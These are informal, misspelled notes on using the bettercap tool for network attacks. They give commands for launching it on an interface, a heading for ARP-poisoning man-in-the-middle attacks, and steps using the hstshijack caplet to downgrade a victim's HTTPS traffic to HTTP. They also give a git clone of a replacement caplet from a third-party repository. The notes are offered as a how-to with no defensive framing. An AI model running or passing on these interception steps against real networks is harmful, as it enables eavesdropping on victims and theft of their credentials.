bettercap software is a tool for different attack in network like ARP poison:

RUN SOFTWARE:
bettercap -iface eth0 (depends of the adapter) 
help - fore more options:

FOR ANY FUNCTION INFORMATION TYPE:
EXAMPLE:
help arp.spoof 


EXAMPLE ATTACK:
ARP POISON: (MITM) man in the middle:

HSTS: Downgrading https to http:
These steps are imidietly after above steps 
NOTE: IT DOESNT WORK EVERYTIME BECOASE OF SECURITY MEASURES:

IN bettercap:
1.) caplets.show (shows the peaces of codes and commands that we can run in bettercap) (WE ARE LOOCKING FOR "hstshijack.cap"

2.) hstshijack/hstshijack (downgrading the HTTPS to HTTP on the victim machine)

hstshijack.cap replacement: if we want!
LINK: (https://github.com/atilsamancioglu/hstshijackcaplet)
3.)git-clone https://github.com/atilsamancioglu/hstshijackcaplet.git
4.) replace the downloaded files with the files that are original and located in step 1
